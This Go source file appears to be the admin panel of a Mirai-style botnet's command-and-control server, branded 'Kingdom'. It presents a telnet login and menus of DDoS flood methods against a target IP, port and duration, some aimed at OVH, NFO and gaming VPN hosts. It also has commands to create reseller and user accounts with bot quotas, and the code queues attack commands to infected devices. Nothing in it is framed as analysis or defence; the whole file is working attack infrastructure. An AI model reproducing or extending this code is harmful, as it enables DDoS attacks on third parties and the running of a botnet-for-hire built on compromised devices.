package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
    
    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))

   this.conn.Write([]byte("\x1b[1;97m                              Welcome to Kingdom!                             \r\n"))
   this.conn.Write([]byte("\x1b[1;91m                  ═╔═══════════════════════════════════╗═\r\n"))
   this.conn.Write([]byte("\x1b[1;91m                   ║  ┬┌─  ┬  ┌┐┌  ┌─┐  ┌┬┐  ┌─┐  ┌┬┐  ║ \r\n"))
   this.conn.Write([]byte("\x1b[1;97m                   ║  ├┴┐  │  │││  │ ┬   ││  │ │  │││  ║\r\n"))
   this.conn.Write([]byte("\x1b[1;97m                   ║  ┴ ┴  ┴  ┘└┘  └─┘  ─┴┘  └─┘  ┴ ┴  ║\r\n")) 
   this.conn.Write([]byte("\x1b[1;91m                  ═╚═══════════════════════════════════╝═\r\n")) 
    this.conn.Write([]byte("\x1b[1;91m                Username\x1b[1;97m: \x1b[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;91m                Password\x1b[1;97m: \x1b[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;97mIncorrect User and Pass. Your IP has been logged!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d Devices | Kingdom | User: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[1;97m          ╦╔═\x1b[1;91m  ╦\x1b[1;97m  ╔╗╔\x1b[1;91m  ╔═╗\x1b[1;97m  ╔╦╗\x1b[1;91m   ╔═╗\x1b[1;97m  ╔╦╗ \r\n"))
    this.conn.Write([]byte("\x1b[1;97m          ╠╩╗\x1b[1;91m  ║\x1b[1;97m  ║║║\x1b[1;91m  ║ ╦\x1b[1;97m   ║║\x1b[1;91m   ║ ║\x1b[1;97m  ║║║ \r\n"))
    this.conn.Write([]byte("\x1b[1;97m          ╩ ╩\x1b[1;91m  ╩\x1b[1;97m  ╝╚╝\x1b[1;91m  ╚═╝\x1b[1;97m  ═╩╝\x1b[1;91m   ╚═╝\x1b[1;97m  ╩ ╩ \r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;91mSocial\x1b[0m~$ "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "quit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[1;97m          ╦╔═\x1b[1;91m  ╦\x1b[1;97m  ╔╗╔\x1b[1;91m  ╔═╗\x1b[1;97m  ╔╦╗\x1b[1;91m   ╔═╗\x1b[1;97m  ╔╦╗ \r\n"))
    this.conn.Write([]byte("\x1b[1;97m          ╠╩╗\x1b[1;91m  ║\x1b[1;97m  ║║║\x1b[1;91m  ║ ╦\x1b[1;97m   ║║\x1b[1;91m   ║ ║\x1b[1;97m  ║║║ \r\n"))
    this.conn.Write([]byte("\x1b[1;97m          ╩ ╩\x1b[1;91m  ╩\x1b[1;97m  ╝╚╝\x1b[1;91m  ╚═╝\x1b[1;97m  ═╩╝\x1b[1;91m   ╚═╝\x1b[1;97m  ╩ ╩ \r\n"))
    continue
        }   

        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\x1b[1;97m╔═════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;91m║ Hub      -  SHOWS ATTACK METHODS    ║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m║ OVHHUB   - SHOWS OVH METHODS        ║\r\n"))  
            this.conn.Write([]byte("\x1b[1;97m║ FOUNDERS - FOUNDER OF Kingdom       ║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m║ OVHHUBV2 - SHOWS MORE OVH            ║\r\n"))  
            this.conn.Write([]byte("\x1b[1;97m║ L7HUB    - SHOWS LAYER 7 HUB        ║\r\n")) 
            this.conn.Write([]byte("\x1b[1;97m║ NFOHUB   - SHOWS NFO METHODS        ║\r\n"))                                   
            this.conn.Write([]byte("\x1b[1;91m╚═════════════════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "admcmds" || cmd == "admstuff" {
            this.conn.Write([]byte("\x1b[1;97m╔════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;91m║ Regular    ║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m║ Reseller   ║\r\n"))
            this.conn.Write([]byte("\x1b[1;91m║ REMOVEUSER ║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m╚════════════╝\r\n"))
            continue
        }

                if err != nil || cmd == "HUB" || cmd == "hub" {
                this.conn.Write([]byte("\x1b[1;97m╔══════════════════════════════════╗\r\n"))   
                this.conn.Write([]byte("\x1b[1;97m║udp   [IP] [TIME] dport=[PORT]    ║\r\n"))   
                this.conn.Write([]byte("\x1b[1;97m║std   [IP] [TIME] dport=[PORT]    ║\r\n"))   
                this.conn.Write([]byte("\x1b[1;97m║dns   [IP] [TIME] dport=[PORT]    ║\r\n"))   
                this.conn.Write([]byte("\x1b[1;97m╚══════════════════════════════════╝\r\n"))   
                continue
        }
            if err != nil || cmd == "OVHHUB" || cmd == "ovhhub" {
            this.conn.Write([]byte("\x1b[1;97m╔════════════════════════════════════╗\r\n"))
	        this.conn.Write([]byte("\x1b[1;97m║killall     [IP] [TIME] dport=[PORT]║\r\n"))
	        this.conn.Write([]byte("\x1b[1;97m║ovhreck     [IP] [TIME] dport=[PORT]║\r\n"))
	        this.conn.Write([]byte("\x1b[1;97m║ovhsec      [IP] [TIME] dport=[PORT]║\r\n"))
	        this.conn.Write([]byte("\x1b[1;97m║ovhdrop     [IP] [TIME] dport=[PORT]║\r\n"))
	        this.conn.Write([]byte("\x1b[1;97m║psnbypass   [IP] [TIME] dport=[PORT]║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m║gamervpn    [IP] [TIME] dport=[PORT]║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m║vpnkiller   [IP] [TIME] dport=[PORT]║\r\n"))
	        this.conn.Write([]byte("\x1b[1;97m╚════════════════════════════════════╝\r\n"))
             continue
            }
            if err != nil || cmd == "NFOHUB" || cmd == "nfohub" {
            this.conn.Write([]byte("\x1b[1;97m╔════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;97m║nfokill     [IP] [TIME] dport=[PORT]║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m║nfodrop     [IP] [TIME] dport=[PORT]║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m║nfosec      [IP] [TIME] dport=[PORT]║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m╚════════════════════════════════════╝\r\n"))
            continue
            }
             if err != nil || cmd == "admhydra" || cmd == "hydraadm" {
             this.conn.Write([]byte("\x1b[1;97m╔════════════════════════════════════╗\r\n"))
             this.conn.Write([]byte("\x1b[1;97m║hydra       [IP] [TIME] dport=[PORT]║\r\n"))
             this.conn.Write([]byte("\x1b[1;97m╚════════════════════════════════════╝\r\n"))
             continue
            }
          
           if err != nil || cmd == "L7LHUB" || cmd == "l7hub" {
           this.conn.Write([]byte("\x1b[1;97m╔═══════════════════════════════════════╗\r\n"))
           this.conn.Write([]byte("\x1b[1;91m║cf [IP] [TIME]  Domain=[DOMAIN]  Conns=║\r\n"))
           this.conn.Write([]byte("\x1b[1;97m║http [IP] [TIME] Domain=[DOMAIN] Conns=║\r\n"))
           this.conn.Write([]byte("\x1b[1;91m╚═══════════════════════════════════════╝\r\n"))
           continue
       }
            if err != nil || cmd == "FOUNDERS" || cmd == "founders" {
            this.conn.Write([]byte("\x1b[1;97m╔══════════════════════════════════╗\r\n"))   
            this.conn.Write([]byte("\x1b[1;97m║ Creator -                  ║\r\n"))   
            this.conn.Write([]byte("\x1b[1;97m║ ADMIN   - COMING SOON                   ║\r\n"))   
            this.conn.Write([]byte("\x1b[1;97m║ ADMIN   - COMING SOON                   ║\r\n"))   
            this.conn.Write([]byte("\x1b[1;97m║ ADMIN   - COMING SOON                   ║\r\n"))
            this.conn.Write([]byte("\x1b[1;97m║ ADMIN   - COMING SOON                   ║\r\n"))      
            this.conn.Write([]byte("\x1b[1;97m╚══════════════════════════════════╝\r\n"))   
         continue
       }
         if err != nil || cmd == "OVHHUBV2" || cmd == "ovhhubv2" {
         this.conn.Write([]byte("\x1b[1;97m╔════════════════════════════════════╗\r\n"))
         this.conn.Write([]byte("\x1b[1;97m║crazykill   [IP] [TIME] dport=[PORT]║\r\n"))
         this.conn.Write([]byte("\x1b[1;97m║ovhkiller   [IP] [TIME] dport=[PORT]║\r\n"))
         this.conn.Write([]byte("\x1b[1;97m║ovhcrush    [IP] [TIME] dport=[PORT]║\r\n"))
         this.conn.Write([]byte("\x1b[1;97m╚════════════════════════════════════╝\r\n"))
         continue
        }
        if err != nil || cmd == "!vipattacks" || cmd == "!vipmethods" {
        this.conn.Write([]byte("\x1b[1;97m╔════════════════════════════════════╗\r\n"))
        this.conn.Write([]byte("\x1b[1;97m║orbital     [IP] [TIME] dport=[PORT]║\r\n"))
        this.conn.Write([]byte("\x1b[1;97m║pump        [IP] [TIME] dport=[PORT]║\r\n"))
        this.conn.Write([]byte("\x1b[1;97m║kill-allv2  [IP] [TIME] dport=[PORT]║\r\n"))
        this.conn.Write([]byte("\x1b[1;97m║slap        [IP] [TIME] dport=[PORT]║\r\n"))
        this.conn.Write([]byte("\x1b[1;97m╚════════════════════════════════════╝\r\n"))
        continue
    }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "Regular" {
            this.conn.Write([]byte("\x1b[1;91mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;91mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;91mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;91mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;91mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;36m- New User Info - \r\n- Username - \x1b[1;36m" + new_un + "\r\n\033[0m- Password - \x1b[1;36m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;36m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;36m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;36m" + cooldown_str + "   \r\n\x1b[1;91mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;91mUser Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "REMOVEUSER" {
            this.conn.Write([]byte("\x1b[1;91mUsername: \x1b[0m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \x1b[1;91mAre You Sure You Want To Remove \x1b[1;36m" + rm_un + "\x1b[1;91m?(y/n): \x1b[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\x1b[1;91mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "Reseller" {
            this.conn.Write([]byte("\x1b[1;91mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;97mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;91mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;91mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;91mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;36m- New User Info - \r\n- Username - \x1b[1;36m" + new_un + "\r\n\033[0m- Password - \x1b[1;36m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;36m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;36m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;36m" + cooldown_str + "   \r\n\x1b[1;91mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;91mAdmin Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36m%s \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mTotal \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
